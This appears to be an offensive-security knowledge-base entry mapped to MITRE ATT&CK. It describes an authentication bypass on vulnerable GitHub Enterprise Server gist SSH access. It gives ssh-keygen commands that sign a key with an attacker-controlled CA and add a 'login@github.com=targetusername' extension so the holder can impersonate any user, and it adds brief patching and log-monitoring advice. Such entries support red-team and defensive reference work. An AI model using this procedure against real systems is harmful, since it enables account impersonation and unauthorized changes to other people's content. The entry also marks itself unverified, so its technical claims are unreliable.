---
tags:
  - ssh
  - certificate
  - authentication-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/ssh-keygen-generate-certificate]]'
platforms:
  - Web
  - GitHub Enterprise Server
techniques:
  - '[[Use Alternate Authentication Material]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f736dd6e-a619-4ff6-b829-2fa8b7efb5c9
created_at: '2025-12-11T03:47:39.350Z'
updated_at: '2025-12-11T03:47:39.350Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1550]]'
---
# Generate SSH Certificate with Arbitrary Username Extension

## Summary

This procedure outlines how to create an SSH certificate with a custom extension that specifies an arbitrary username, exploiting a missed validation check in GitHub's gist authentication flow to impersonate users.

## Description

In vulnerable GitHub Enterprise Server versions, SSH certificates can include extensions like 'login@github.com=username' without proper validation, allowing authentication as any user. This is used to bypass checks and gain unauthorized access to modify gists. The procedure requires a CA key for signing (attacker-controlled) and targets the gist.github.com SSH service.

## Requirements

1. Access to ssh-keygen tool
2. An attacker-controlled CA key and user key pair
3. Knowledge of the target username

## Defense

Defensive measures and detection strategies:

- Update GitHub Enterprise Server to patched versions (3.9 or later)
- Monitor SSH authentication logs for unusual certificate extensions or unexpected user authentications

## Objectives

1. Create a crafted SSH certificate for authentication bypass
2. Enable impersonation of target users on gist.github.com
3. Prepare for unauthorized gist modifications

## Instructions

### Step 1: Generate User Key Pair

**Context**: Create a basic SSH key pair if not already available.

**Command** ([[commands/ssh-keygen-generate-certificate]]):
```bash
ssh-keygen -t ed25519 -f user_key
```

> This generates a user key pair for signing into a certificate.

### Step 2: Sign Certificate with Custom Extension

**Context**: Sign the user public key with a CA key, adding the custom username extension.

**Command** ([[commands/ssh-keygen-generate-certificate]]):
```bash
ssh-keygen -s ca_key -I cert_id -n principals -O extension:login@github.com=targetusername user_key.pub
```

> This creates a certificate file (user_key-cert.pub) with the extension allowing authentication as 'targetusername'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Use Alternate Authentication Material]]

### Sub-Techniques

## Commands Used

- [[commands/ssh-keygen-generate-certificate]]

## Tools Used

- #ssh-keygen

## Tags

- #ssh-keygen
- [[commands/ssh-keygen-generate-certificate]]
- #authentication-bypass
